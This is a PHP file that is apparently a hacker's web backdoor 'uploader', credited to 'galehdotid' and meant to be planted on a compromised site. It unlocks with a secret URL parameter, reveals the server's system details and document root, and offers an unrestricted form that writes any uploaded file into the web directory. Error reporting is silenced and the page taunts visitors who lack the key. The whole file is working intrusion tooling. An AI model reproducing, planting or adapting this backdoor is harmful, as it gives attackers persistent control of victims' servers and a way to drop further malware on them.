<?php
/**
* galehdotid
* http://target.com/upload.php?cmd=buka
*/
error_reporting(0);
 if($_GET['cmd'] == 'buka'){
 	echo "<title>". $_SERVER[HTTP_HOST] ." &mdash; galehdotid (uploader)</title><link href=\"https://ichef.bbci.co.uk/news/660/cpsprodpb/7350/production/_102502592_gettyimages-653379702-1.jpg\" rel=\"icon\" type=\"image/x-icon\"><style> body { background: black; } </style><center><font face=\"comic sans ms\">
<br><br>
<font color=\"blue\">".php_uname()."</font>
<br><br>
<font color=\"red\">".$_SERVER["DOCUMENT_ROOT"]."/</font>
<br><br>
<font color=\"pink\"><form action=\"\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"filetoupload\"> <input type=\"submit\" value=\"upload\" name=\"submit\"></form></font></center>";
if(isset($_POST["submit"])) { if (@copy($_FILES["filetoupload"]["tmp_name"], $_FILES["filetoupload"]["name"])) { 
echo "<center><font face=\"Courier New\"><a href=\" ".$_FILES["filetoupload"]["name"]." \" style=\"text-decoration:none\"><font color=\"white\"> ". basename( $_FILES["filetoupload"]["name"])." </font></a><font color=\"#7FFF00\"> => </font><font color=\"#4169E1\">success</font><br><br></font></center>"; }
else { echo "<center><font face=\"Courier New\"><font color=\"white\"> ". basename( $_FILES["filetoupload"]["name"])." </font><font color=\"#7FFF00\"> => </font><font color=red>failed</font><br><br></font></center>"; }
}

 }else{
 	echo "Mauu Nikung ?!";
 }

?>